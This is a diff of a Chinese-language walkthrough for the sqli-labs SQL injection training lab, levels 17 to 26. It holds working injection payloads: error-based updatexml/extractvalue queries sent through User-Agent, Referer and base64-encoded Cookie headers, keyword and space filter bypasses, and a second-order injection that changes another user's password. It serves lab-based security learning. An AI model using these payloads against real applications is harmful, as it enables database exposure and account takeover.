@@ -355,30 +355,300 @@
 
 ## Less-17
 
-是否有报错,是否回显
++ 是否有报错,是否回显
 
-注入方式:
++ 注入方式:
 
-注入Payload
++ 注入Payload
+
++ 请求头，应该用 # 或者 --空格  注释 ，--+只能在RUL中使用，在URL中# 编码后 带入数据库是 空格 
+
+## Less-18
+
++ 正常输入 页面显示 UserAgent 信息， 考虑 UA注入
+修改UA信息可以正常显示，UA后面夹 单引号， 页面报错，
+
++ 根据报错信息显示，可知闭合方式：
+‘）  字符型注入 
+
++ 注入方式:
+
++ 注入Payload：
+    ```bash
+    ajest' and updatexml(1,concat('^',(select version()),'^'),1) and  '1'='1
+    ```
+
+## Less-19
+
++ referer 注入 
+
++ 正常输入，返回referer 值 ， 考虑 referer 注入 bp抓包 
+
++ 修改referer 值可正常页面显示 
++ referer" 显示正常
++ referer' 页面有回显 ，报错 ，说明referer 值被带入数据库，进行读写
+
++ 闭合方式：
+    ```bash
+    ajest'  and '1'='1
+    ```
+
++ 注入Payload
+    ```bash
+    ajest' and updatexml(1,concat('^',(select version()),'^'),1) and '1'='1
+    ```
+
+## Less-20
+
++ 此关 正常输入，会一直显示 ILOVEYOU COOKIE ，此提示是让你添加 cookie 头部信息，同时需要删除 POST请求 
+
++ 用burpsuit 抓包 修改后，结果页面显示如下：
+
++ 页面会返回 YOUR USER AGENT/YOU IP ADDRESS/YOU COOKIE  
++ 用bp 修改  COOKIE 后面添加  双引号  ，页面显示正常。 添加 单引号 页面报错  ， 报错信息中可知  ：
+
++ 闭合方式： ‘ 单引号
++ 字符型注入
+
++ 用报错注入进行测试
+    ```bash
+    Cookie:uname=Dumb' #          #返回界面 显示 很和谐，正常 
+
+    Cookie:uname=Dumb' --+        #返回界面 显示 很和谐，正常 
+
+    Cookie:uname=Dumb' --      # 用杠杠空格 进行注释  ，页面报错 
+    ```
+
++ 注入Payload：
+    ```bash
+    Cookie:uname=Dumb' and updatexml(1,concat('^',(select version()),'^'),1) # 
+
+    Cookie:uname=Dumb' and updatexml(1,concat('^',(select version()),'^'),1) --+
+    ```
+
++ 也可在浏览器控制台中进行 COOKIE 注入 
+
+    ```bash
+    document.cookie="uname=Dumb' and updatexml(1,concat('^',(select version()),'^'),1) --+"
+    ```
+
++ 注入后 刷新界面。注意 COOKIE 字段 需要 双引号 包围 ！！！
+
+## Less-21
+
++ 正常用户名:Dumb密码:Dumb 输入， 页面回显 YOUR COOKIE : uname = RHVtYg== and expires: Sat 08 Oct 2022 - 11:50:48
+
+![](img/Less-21.2.png)
+
+![](img/Less-21.3.png)
+
++ 回显用户名为Base64 编码方式 
+
+ ![](img/Less-21.1.png)
+
++ 通过burpsuit  抓包发现 ，HTTP history 中，正常登陆时 有两个请求，
+
++ 首先是 POST请求状态码302  ，然后GET请求状态码200 ,
+在GET 请求中 有Cookie字段，内容为Base64 编码， 页面返回内容就是GET请求的Cookie字段 
+
++ 所以尝试 修改 GET 请求中的 Cookie 字段  （需Base64 编码）
+
++ Cookie 字段后面夹  ‘    单引号 报错
+
++ 报错信息可知，闭合方式：  ’）
++ 单引号 括号 
++ 字符型注入
+
++ 注入测试：
+    ```bash
+    Dumb' or '1'='1 （RHVtYicgb3IgJzEnPScx） # 页面显示很和谐 
+    ```
+
+![](img/Less-21.4.png)
+
++ 注入Payload:
+    ```bash
+    Dumb' and updatexml(1,concat('^',(select version()),'^'),1) or '1'='1(RHVtYicgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgnXicsKHNlbGVjdCB2ZXJzaW9uKCkpLCdeJyksMSkgb3IgJzEnPScx)
+
+    Cookie: uname=RHVtYicgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgnXicsKHNlbGVjdCB2ZXJzaW9uKCkpLCdeJyksMSkgb3IgJzEnPScx
+    ```
+![](img/Less-21.5.png)
 
 
-Less-18
+## Less-22
 
-是否有报错,是否回显
++ 正常输入显示 同21关
++ 通过 burpsuit 抓包 可知POST请求 重定向  GET请求 ，内涵 Cookie 字段，
 
-注入方式:
+![](img/Less-22.1.png)
 
-注入Payload
++ Cookie 字段后面夹  “   双引号 报错
+
+![](img/Less-22.3.png)
+
+![](img/Less-22.2.png)
+
++ 报错信息可知，闭合方式： ”
++ 字符型注入
++ 双引号
+
++ 注入测试：
+
++ Cookie字段  uname=
+    ```bash
+    Dumb" or "1" ="1
+    RHVtYiIgb3IgIjEiID0iMQ==      #输入后页面和和谐   。没有报错
+
+    Dumb" or "1 #
+    RHVtYiIgb3IgIjEgIw==           # 输入后页面很和谐
+
+    Dumb" "1 #
+    RHVtYiIgIjEgIw==                     # 输入后页面很和谐
+
+    Dumb""
+    RHVtYiIi			  # 输入后页面很和谐
+    ```
++ 注入Payload：
+    ```bash
+    Cookie字段  uname=
+
+    Dumb" and updatexml(1,concat('^',(select version()),'^'),1) or "1 
+
+    RHVtYiIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgnXicsKHNlbGVjdCB2ZXJzaW9uKCkpLCdeJyksMSkgb3IgIjEg
 
 
-Less-19
+    Dumb" and updatexml(1,concat('^',(select version()),'^'),1) or " 1 #
 
-是否有报错,是否回显
+    RHVtYiIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgnXicsKHNlbGVjdCB2ZXJzaW9uKCkpLCdeJyksMSkgb3IgIiAxICM=
+    ```
 
-注入方式:
+![](img/Less-22.4.png)
 
-注入Payload
+## Less-23
 
++ 正常输入 数据库有回显， 变化 id参数  数据库回显有变化 
+
++ id参数后 接  “ 双引号  页面较之前没有变化 
+
+
++ id参数后 接  ‘  单引号  页面较之前有报错 。 从报错信息可知， 闭合方式 ： 
+ ’ 
+字符型注入
+
++ 注入测试：
+
+    ```bash
+    http://10.0.2.15/sqli-labs/Less-23/?id=2' or '1'='1             # 页面很和谐 
+    ```
+
++ 注入Payload:   报错注入
+    ```bash
+    http://10.0.2.15/sqli-labs/Less-23/?id=2' and extractvalue(1,concat('^',(select version()),'^')) or '1'='1 
+    ```
+![](img/Less-23.1.png)
+
+
+## Less-24 
+
++ 二次注入 逻辑漏洞
+
++ 首先使用 账号： Dump ，密码： Dump  正常登陆后，显示可以修改密码 
+
++ 首页有忘记密码 ，和 注册新帐号 选项 
+
++ 选择  注册新账号 
++ 考虑存在注入漏洞 ，注册账号时 注册一个 已有账号 后面，接 特殊字符  如 ： Dumb' 或者 Dumb"  或者 Dumb）或者 Dumb' #   、 Dumb" #   、 Dumb) #  、 Dumb' -- 
+
++ 注册完成后，进入界面 ，有修改密码选项   ，尝试对 新注册用户进行 密码修改 
+
++ 对 Dumb' # 账号进行密码修改123， 实际是修改 Dumb 账号的 密码 (Dumb' # 账号密码并未更改)
++ 登出后，Dumb：123 （原密码：Dumb）
+
++ 注入Payload:
+
++ 注册新账号： Dumb' #   ： 123456     /  Dumb' -- :123456
+
+
++ 登陆账号 ：Dumb' #/Dumb' -- 登陆成功后，按要求修改密码：654321 reset后 退出账号 
+
++ 登陆 Dumb：654321 发现登陆成功 。
+
+## Less-25
+
++ 输入id参数 页面回显输入的参数  ， 当在参数后面添加 特殊字符时 ，发现页面过滤了 "字符"：or and 
+
++ 参数后 添加 ‘、“、） 时 ，其他 ‘  单引号 ，页面回显报错 
+
+![](img/Less-25.1.png)
+
+![](img/Less-22.2.png)
+
++ 通过报错信息可知，闭合方式：
+
+    ’ 单引号 
++ 可以考虑结尾需要参数和单引号闭合  ： id=1’and‘1     id=2’and‘1
+
++ 由于，or ,and 被过滤  所以考虑 union all select  注入方式 ， 另外 ，选择双写绕过  oorr, aandnd
+
+ 
++ 输入 id=1 union all select '1  页面提示错误， 列数不对 
+
++ 输入 3列页面提示正常 
+
+![](img/Less-25.3.png)
+
++ 注入测试：
+
+    ```bash
+    http://10.0.2.15/sqli-labs/Less-25/?id=2' oORr '1 
+    http://10.0.2.15/sqli-labs/Less-25/?id=2' aandnd '1     # 两次输入都很和谐，页面显示正常 
+    ```
+![](img/Less-25.4.png)
+
++ 注入Payload:
+    ```bash
+    http://10.0.2.15/sqli-labs/Less-25/?id=-2' union all select 1,version() ,'3
+
+    http://10.0.2.15/sqli-labs/Less-25/?id=2' aandnd updatexml(1,concat('^',(select version()),'^'),1) anandd'1 
+
+    http://10.0.2.15/sqli-labs/Less-25/?id=2' oorr updatexml(1,concat('^',(select version()),'^'),1) oORr '1 
+    ```
+![](img/Less-22.5.png)
+
+## Less-26 
+
++ 输入参数正常显示，参数后添加 单引号 ‘ ， 双引号 ” 小括号 ）  
+
++ 发现 添加 单引号   ’  页面回显报错   通过报错信息 可知，闭合方式： 单引号 ‘
+字符型注入 
+
+![](img/Less-26.1.png)
+
++ 输入参数; id=2' ' ,页面回显发现，空格被过滤掉  and，or 也过滤 
+
+![](img/Less-26.2.png)
+
++ 过滤了空格 ，可以考虑需要空格 的地方，用小括号 括起来 。and or 绕过方法 ：1 ，双写 。2 &&/%26%26(代替and),     ||  (代替or)  ,注释符 # ，--空格， --+  被过滤，可以考虑 用 ；%00 ，00截断 代替。
+
++ 注入Payload:
+    ```bash
+    http://10.0.2.15/sqli-labs/Less-26/?id=2'anandd (updatexml(1,concat('^', version(),'^'),1))oorr'1'= '1 
+
+    http://10.0.2.15/sqli-labs/Less-26/?id=2'%26%26 (updatexml(1,concat('^', version(),'^'),1))||'1'= '1
+
+    http://10.0.2.15/sqli-labs/Less-26/?id=2'%26%26 (updatexml(1,concat('^', version(),'^'),1))||1;%00
+    ```
+![](img/Less-26.3.1.png)
+
+![](img/Less-26.3.png)
+
+![](img/Less-26.4.1.png)
+
+![](img/Less-26.4.png)
+
+![](img/Less-26.5.png)
+
+![](img/Less-26.6.png)
 
 Less-20
 
